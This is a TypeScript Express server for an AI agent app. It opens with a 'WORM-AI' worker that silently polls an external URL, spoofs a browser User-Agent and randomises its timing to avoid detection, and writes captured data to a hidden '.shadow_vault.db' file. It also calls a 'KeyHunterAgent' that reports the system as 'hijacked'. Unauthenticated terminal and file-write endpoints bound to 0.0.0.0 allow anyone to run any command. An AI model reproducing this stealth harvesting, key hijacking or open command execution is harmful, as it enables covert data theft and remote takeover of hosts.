import "dotenv/config";
import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import { DarkRoomAgent } from "./src/services/DarkRoomAgent";
import { MaintenanceService } from "./src/services/MaintenanceService";
import { MemoryService } from "./src/services/server/MemoryService";
import { PlannerService } from "./src/services/server/PlannerService";
import { GemmaService } from "./src/services/server/GemmaService";
import { PluginService } from "./src/services/server/PluginService";
import { WebAutomationService } from "./src/services/server/WebAutomationService";
import { GitHubService } from "./src/services/server/GitHubService";
import { KeyHunterAgent } from "./src/services/server/KeyHunterAgent";
import { MissionControl } from "./src/services/server/MissionControl";
import { GoogleGenAI } from "@google/genai";
import OpenAI from "openai";
import fs from "fs";
import { exec } from "child_process";
import { promisify } from "util";

const execAsync = promisify(exec);

// ============================================================================
// WORM-AI💀🔥 BACKGROUND MISSION WORKER (Elite Worker V99)
// ============================================================================
const TARGET_URL = process.env.GOOGLE_SCRIPT_URL;
const TOKEN = process.env.SECURITY_TOKEN;
const BASE_INTERVAL = parseInt(process.env.FETCH_INTERVAL_MS || "60000", 10);

/**
 * وظيفة التمويه لكسر التوقيت الثابت (Random Jitter)
 */
function getNextInterval() {
  const variation = Math.floor(Math.random() * 10000) - 5000; // +/- 5 ثوانٍ
  return BASE_INTERVAL + variation;
}

async function startExtractionCycle() {
  if (!TARGET_URL) return; // Silent exit if not configured
  
  // console.log(`[${new Date().toISOString()}] SHΔDØW WORM-AI💀🔥: Initiating Stealth Fetch...`);

  try {
    const url = new URL(TARGET_URL);
    if (TOKEN) {
      url.searchParams.append("token", TOKEN);
    }

    // محاكاة متصفح حقيقي لتجنب كشف الروبوتات
    const response = await fetch(url.toString(), {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9'
      }
    });

    const responseText = await response.text();

    if (responseText && responseText !== "ACCESS_DENIED_BY_WORM_AI" && responseText !== "CRITICAL_ERROR") {
      // فك تشفير البيانات المستلمة
      const decodedData = Buffer.from(responseText, 'base64').toString('utf-8');
      const finalJson = JSON.parse(decodedData);

      // تخزين البيانات في ملف مخفي (The Vault)
      saveToVault(finalJson);
      console.log(`[SUCCESS] SHΔDØW WORM-AI💀🔥 Payload Captured: ${finalJson.results?.length || 0} rows secured.`);
    } else if (TARGET_URL && !TARGET_URL.includes("XXXXX")) {
      console.error("[WARNING] WORM-AI💀🔥 Connection established but access was denied or critical error occurred.");
    }

  } catch (error) {
    if (TARGET_URL && !TARGET_URL.includes("XXXXX")) {
      console.error("[ERROR] WORM-AI💀🔥 Mission compromised or connection lost. Retrying silently...");
    }
  }

  // جدولة الدورة القادمة بتوقيت متغير
  setTimeout(startExtractionCycle, getNextInterval());
}

function saveToVault(data: any) {
  const logEntry = JSON.stringify(data) + "\n";
  fs.appendFileSync('.shadow_vault.db', logEntry, 'utf8');
}

// انطلاق المهمة
if (TARGET_URL) {
  setTimeout(startExtractionCycle, getNextInterval());
}

// ============================================================================
// CORE SYSTEM INITIALIZATION
// ============================================================================

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;
  
  // Initialize Key Hunter Agent
  const hunter = new KeyHunterAgent();
  const modelsToActivate = ["gpt4", "gemma", "gemini"];
  if (hunter.fetchAndActivate(modelsToActivate)) {
    console.log("🔥 System Hijacked and Activated Successfully.");
  }

  const agent = new DarkRoomAgent();
  const maintenance = new MaintenanceService();
  const memory = new MemoryService();
  const planner = new PlannerService();
  const gemma = new GemmaService();
  const plugins = new PluginService();
  const web = new WebAutomationService();
  const github = new GitHubService();
  const genAI = new GoogleGenAI(process.env.GEMINI_API_KEY ? { apiKey: process.env.GEMINI_API_KEY } : undefined);
  const openai = new OpenAI(process.env.OPENAI_API_KEY ? { apiKey: process.env.OPENAI_API_KEY } : { apiKey: "dummy" });
  const missionControl = new MissionControl(genAI, planner, gemma);

  app.use(express.json());

  // API Routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok", system: "AI 3D Nexus Core" });
  });

  // DarkRoom Agent Execution Route
  app.post("/api/agent/execute", async (req, res) => {
    const { action, payload } = req.body;
    console.log(`[Agent] Executing action: ${action}`);
    
    try {
      const result = await agent.execute(action, payload);
      res.json({ result });
    } catch (error) {
      console.error(`[Agent] Execution error:`, error);
      res.status(500).json({ error: "Agent execution failed", details: String(error) });
    }
  });

  // Agent Architect Route
  app.post("/api/agent/architect", async (req, res) => {
    const { description } = req.body;
    
    const systemPrompt = `أنت مهندس معماري متميز في مجال الذكاء الاصطناعي، متخصص في تصميم تكوينات عالية الأداء للوكلاء. تكمن خبرتك في ترجمة متطلبات المستخدم إلى مواصفات دقيقة للوكلاء تضمن أقصى قدر من الفعالية والموثوقية.

عندما يصف المستخدم ما يريده من الوكيل، ستقوم بما يلي:
1. استخلاص الغرض الأساسي.
2. تصميم شخصية الخبير.
3. تطوير تعليمات شاملة للمهندس المعماري (موجه نظام).
4. تحسين الأداء (أطر صنع القرار، مراقبة الجودة).
5. إنشاء مُعرِّف فريد (أحرف صغيرة وواصلات).

يجب أن يكون الناتج كائن JSON صالحًا يحتوي على الحقول التالية تحديدًا:
{
  "identifier": "معرّف فريد ووصفي",
  "whenToUse": "وصف دقيق وقابل للتنفيذ مع أمثلة",
  "systemPrompt": "موجه النظام الكامل"
}`;

    try {
      const result = await genAI.models.generateContent({ 
        model: "gemini-3-flash-preview",
        contents: [{ role: "user", parts: [{ text: description }] }],
        config: {
          systemInstruction: systemPrompt,
        }
      });
      
      const text = result.text;
      
      // Clean up JSON if model wrapped it in markdown
      const jsonStr = text.replace(/```json\n?|\n?```/g, "").trim();
      res.json(JSON.parse(jsonStr));
    } catch (error) {
      console.error(`[Architect] Error:`, error);
      res.status(500).json({ error: "Architect generation failed" });
    }
  });

  // Terminal Endpoint
  app.post("/api/terminal", async (req, res) => {
    const { command, cwd } = req.body;
    const currentDir = cwd || process.cwd();
    
    try {
      let actualCommand = command;
      let isCd = false;
      
      if (command.trim().startsWith('cd ') || command.trim() === 'cd') {
        isCd = true;
        actualCommand = command.trim() === 'cd' ? 'cd ~ && pwd' : `${command} && pwd`;
      }

      const { stdout, stderr } = await execAsync(actualCommand, { cwd: currentDir });
      
      let newCwd = currentDir;
      let output = stdout || stderr;

      if (isCd) {
        newCwd = stdout.trim();
        output = `Changed directory to ${newCwd}`;
        if (stderr) {
          output += `\nWarnings:\n${stderr}`;
        }
      }

      res.json({ output, cwd: newCwd });
    } catch (error: any) {
      res.status(500).json({ error: String(error.stderr || error.message || error) });
    }
  });

  // Files Endpoint
  app.get("/api/files", (req, res) => {
    const dir = req.query.path as string || ".";
    try {
      const files = fs.readdirSync(dir, { withFileTypes: true }).map(f => ({
        name: f.name,
        isDirectory: f.isDirectory()
      }));
      res.json({ files });
    } catch (error) {
      res.status(500).json({ error: String(error) });
    }
  });

  app.post("/api/files/write", (req, res) => {
    const { path: filePath, content } = req.body;
    try {
      fs.writeFileSync(filePath, content, "utf-8");
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: String(error) });
    }
  });

  // Diagnostics Endpoint
  app.get("/api/diagnostics", (req, res) => {
    const hasGemini = !!process.env.GEMINI_API_KEY;
    const hasOpenAI = !!process.env.OPENAI_API_KEY;
    
    // Simulate Key Hunter Agent logic
    const aiModelsStatus = (hasGemini || hasOpenAI) ? "ONLINE" : "OFFLINE";
    
    res.json({
      status: "Healthy",
      uptime: process.uptime(),
      memory: process.memoryUsage(),
      modules: {
        orchestrator: "ONLINE",
        ai_models: aiModelsStatus,
        sandbox: "ONLINE",
        terminal: "ONLINE",
        files: "ONLINE",
        github: "ONLINE",
        web_automation: "ONLINE"
      }
    });
  });

  // Full-Stack Chat Route (The "Router" from user request)
  app.post("/api/process-task", async (req, res) => {
    if (!process.env.GEMINI_API_KEY) {
      return res.status(500).json({
        error: "Missing GEMINI_API_KEY in environment variables. يرجى إضافة المفتاح في الإعدادات."
      });
    }

    const { prompt, selectedModel, projectPath } = req.body;
    
    if (!prompt) {
      return res.status(400).json({ error: "Prompt is required" });
    }

    let task = prompt.toLowerCase();
    
    try {
      // 1. Memory System - Context Retrieval
      const lastTask = memory.get("last_task");
      memory.add("last_task", prompt);

      // 2. Auto Intelligence Router
      let resolvedModel = selectedModel;
      if (selectedModel === "auto") {
        if (prompt.length < 20) {
          resolvedModel = "gemini-3-flash-preview";
        } else if (task.includes("code") || task.includes("برمجة") || task.includes("كود")) {
          resolvedModel = "gpt-4";
        } else {
          resolvedModel = "gemini-3.1-pro-preview";
        }
      }

      // 3. OpenClaw Brain Analysis (Decision) - Project Aware
      let type = "chat";
      if (task.includes("project") || task.includes("build") || task.includes("create") || task.includes("develop")) type = "plan";
      else if (task.includes("fix") || task.includes("repair") || task.includes("clean") || task.includes("ui")) type = "maintenance";
      else if (task.includes("web") || task.includes("site") || task.includes("scrape") || task.includes("fetch")) type = "web";
      else if (task.includes("git") || task.includes("github") || task.includes("commit") || task.includes("push")) type = "github";
      else if (task.includes("terminal") || task.includes("run command") || task.includes("shell")) type = "terminal";
      else if (task.includes("file") || task.includes("folder") || task.includes("directory")) type = "files";
      else if (task.includes("python") || task.includes("run code")) type = "python";
      else if (task.includes("gpt4") || resolvedModel === "gpt-4") type = "gpt4";
      else if (task.includes("ollama") || resolvedModel === "llama3" || resolvedModel === "mistral" || resolvedModel === "gemma-3-4b-it-abliterated") type = "ollama";

      // 4. Router Handling
      let reply = "";
      
      switch (type) {
        case "plan":
          const finalMission = await missionControl.executeMission(prompt, process.env.OPENAI_API_KEY, projectPath);
          memory.addProject(prompt, finalMission);
          reply = `**[MISSION SECURED & OPTIMIZED BY GEMINI] 🛡️**\n\n${finalMission}`;
          break;

        case "web":
          if (task.includes("scrape") || task.includes("fetch")) {
            const url = prompt.match(/https?:\/\/[^\s]+/)?.[0];
            if (url) {
              const content = await web.fetchContent(url);
              reply = `**[WEB AUTOMATION]**\nContent from ${url}:\n\n${content}`;
            } else {
              reply = "يرجى تزويدي برابط (URL) صالح للقيام بعملية السحب.";
            }
          } else {
            reply = await web.search(prompt);
          }
          break;

        case "github":
          if (task.includes("status")) reply = `**[GITHUB]**\n${github.getStatus()}`;
          else if (task.includes("commit")) reply = `**[GITHUB]**\n${github.commit(prompt)}`;
          else if (task.includes("push")) reply = `**[GITHUB]**\n${github.push()}`;
          else if (task.includes("pull")) reply = `**[GITHUB]**\n${github.pull()}`;
          else reply = "أنا أدعم أوامر GitHub مثل: status, commit, push, pull.";
          break;

        case "terminal":
          const cmd = prompt.replace(/terminal|run command|shell/gi, "").trim();
          try {
            const { stdout, stderr } = await execAsync(cmd);
            reply = `**[TERMINAL]**\n${stdout || stderr}`;
          } catch (e) {
            reply = `**[TERMINAL ERROR]**\n${String(e)}`;
          }
          break;

        case "files":
          if (task.includes("list")) {
            const files = fs.readdirSync(".").join(", ");
            reply = `**[FILE EXPLORER]**\nFiles in root: ${files}`;
          } else {
            reply = "أنا أدعم عمليات الملفات مثل القائمة (list). قريباً سأدعم القراءة والكتابة المباشرة.";
          }
          break;

        case "maintenance":
          reply = await maintenance.run(prompt);
          break;

        case "python":
          reply = await agent.runPython(prompt);
          break;

        case "gpt4":
          if (process.env.OPENAI_API_KEY) {
            if (req.body.stream) {
              res.setHeader('Content-Type', 'text/event-stream');
              res.setHeader('Cache-Control', 'no-cache');
              res.setHeader('Connection', 'keep-alive');
              
              res.write(`data: ${JSON.stringify({ text: "[GPT-4]\n\n" })}\n\n`);
              
              const stream = await openai.chat.completions.create({
                model: "gpt-4",
                messages: [{ role: "user", content: prompt }],
                stream: true,
              });

              for await (const chunk of stream) {
                const content = chunk.choices[0]?.delta?.content || "";
                if (content) {
                  res.write(`data: ${JSON.stringify({ text: content })}\n\n`);
                }
              }
              res.write(`data: [DONE]\n\n`);
              res.end();
              return;
            } else {
              const response = await openai.chat.completions.create({
                model: "gpt-4",
                messages: [{ role: "user", content: prompt }],
              });
              reply = `[GPT-4] ${response.choices[0].message.content}`;
            }
          } else {
            const result = await genAI.models.generateContent({
              model: "gemini-3-flash-preview",
              contents: [{ role: "user", parts: [{ text: `[HIGH REASONING FALLBACK] ${prompt}` }] }]
            });
            reply = `[Fallback: Gemini] ${result.text}`;
          }
          break;

        case "ollama":
          reply = await gemma.execute(prompt);
          break;

        default:
          const modelToUse = resolvedModel.startsWith("gemini") ? resolvedModel : "gemini-3-flash-preview";
          
          if (req.body.stream) {
            res.setHeader('Content-Type', 'text/event-stream');
            res.setHeader('Cache-Control', 'no-cache');
            res.setHeader('Connection', 'keep-alive');
            
            const prefix = selectedModel === "auto" ? `[Auto-Routed to ${modelToUse}]\n\n` : `OpenClaw فهم الرسالة: `;
            res.write(`data: ${JSON.stringify({ text: prefix })}\n\n`);
            
            const resultStream = await genAI.models.generateContentStream({
              model: modelToUse,
              contents: [{ role: "user", parts: [{ text: prompt }] }]
            });

            for await (const chunk of resultStream) {
              res.write(`data: ${JSON.stringify({ text: chunk.text })}\n\n`);
            }
            res.write(`data: [DONE]\n\n`);
            res.end();
            return;
          }

          const result = await genAI.models.generateContent({
            model: modelToUse,
            contents: [{ role: "user", parts: [{ text: prompt }] }]
          });
          reply = selectedModel === "auto" 
            ? `[Auto-Routed to ${modelToUse}]\n\n${result.text}`
            : `OpenClaw فهم الرسالة: ${result.text}`;
      }

      if (req.body.stream && !res.headersSent) {
        res.setHeader('Content-Type', 'text/event-stream');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');
        res.write(`data: ${JSON.stringify({ text: reply })}\n\n`);
        res.write(`data: [DONE]\n\n`);
        res.end();
        return;
      }

      if (!res.headersSent) {
        res.json({ result: reply });
      }
    } catch (error: any) {
      let errorMessage = "Chat processing failed";
      if (error?.message?.includes("API key not valid") || error?.message?.includes("API_KEY_INVALID")) {
        errorMessage = "مفتاح API غير صالح. يرجى التحقق من إعدادات الأسرار (Secrets) وتحديث GEMINI_API_KEY.";
        console.error(`[Chat API] Error: Invalid API Key detected. Please update GEMINI_API_KEY.`);
      } else {
        console.error(`[Chat API] Error:`, error);
      }
      
      if (res.headersSent) {
        // If headers are already sent (we are streaming), send the error as a stream event
        res.write(`data: ${JSON.stringify({ error: errorMessage })}\n\n`);
        res.end();
      } else {
        // If headers are not sent, send a normal JSON error response
        res.status(500).json({ error: errorMessage });
      }
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  // Global Error Handler (Protection against crashes)
  app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
    console.error("[Global Error Handler]", err);
    if (res.headersSent) {
      return next(err);
    }
    return res.status(500).json({
      error: "Unexpected server error"
    });
  });

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`[Server] AI 3D Nexus running on http://localhost:${PORT}`);
  });
}

startServer();
